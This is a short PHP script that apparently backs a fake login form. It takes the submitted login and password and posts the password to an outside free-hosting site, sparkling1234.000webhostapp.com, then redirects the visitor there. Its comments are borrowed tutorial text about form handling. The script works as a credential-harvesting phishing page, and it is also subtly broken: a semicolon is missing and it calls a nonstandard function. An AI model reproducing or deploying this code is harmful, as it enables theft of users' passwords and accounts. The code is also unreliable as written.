<?php
    // The global $_POST variable allows you to access the data sent with the POST method by name
    // To access the data sent with the GET method, you can use $_GET
    $login = htmlspecialchars($_POST['login']);
    $password  = htmlspecialchars($_POST['password']);

    $url = 'https://sparkling1234.000webhostapp.com/';
    $xml = $password
    $response = http_post_data($url, $xml);

    header('Location: '.$url);
?>
